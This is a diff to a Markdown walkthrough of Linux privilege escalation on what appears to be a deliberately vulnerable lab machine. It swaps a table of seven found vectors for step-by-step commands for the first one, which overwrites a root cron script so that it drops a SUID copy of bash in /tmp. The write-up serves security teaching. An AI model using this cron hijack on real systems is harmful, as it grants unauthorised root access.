@@ -1,4 +1,4 @@
-# Linux Privilege Escalation 
+<img width="685" height="133" alt="image" src="https://github.com/user-attachments/assets/56d4ebcd-581b-4787-813b-b09c39577804" /># Linux Privilege Escalation 
 
 ## Phase 0: Foothold & Enumeration
 
@@ -146,14 +146,24 @@ This prepends the world-writable `/opt/lab/bin` to PATH for every login shell wh
 
 ---
 
-### Summary of Vectors Identified
+## V1 - Writable Directory + Root Cron (Script Hijack)
+First, lets run some confirmation commands to make sure the file and permissions are correct:
 
-| # | Vector | Discovery signal |
-|---|--------|------------------|
-| V1 | Writable dir + root cron (`backup.sh`) | writable `/opt/lab/bin` + `/etc/cron.d` entry |
-| V2 | sudo wildcard on `find` | `sudo -l` rule with trailing `*` |
-| V3 | Writable cron script (`rotate.sh`) | world-writable script referenced by cron |
-| V4 | Missing binary cron expects (`agent`) | cron references a non-existent file in writable dir |
-| V5 | PATH hijack via `/opt/lab/bin` | `profile.d` prepends writable dir to PATH |
-| V6 | Writable `update-motd.d` dir | world-writable MOTD directory |
-| V7 | SUID `python3` | `/opt/lab/bin/python3` in SUID scan |
+<img width="442" height="118" alt="image" src="https://github.com/user-attachments/assets/9330f965-d710-4b2d-bdea-ddbc1b00e751" />
+
+Now lets see what the original backup.sh has in it with `cat /opt/lab/bin/backup.sh`. This shows the following (done in writing for easy copy and paste to restore the original when done):
+```
+#!/bin/bash
+echo "backup done" > /tmp/backup.log
+```
+Now we just need to replace the contents with the following:
+```
+cat > /opt/lab/bin/backup.sh <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+EOF
+chmod +x /opt/lab/bin/backup.sh
+```
+Then wait 5 min until running the following cmd to confirm escalation:
+
+<img width="654" height="85" alt="image" src="https://github.com/user-attachments/assets/c4ef3602-6b0b-4477-b509-91ce0d60a7ef" />
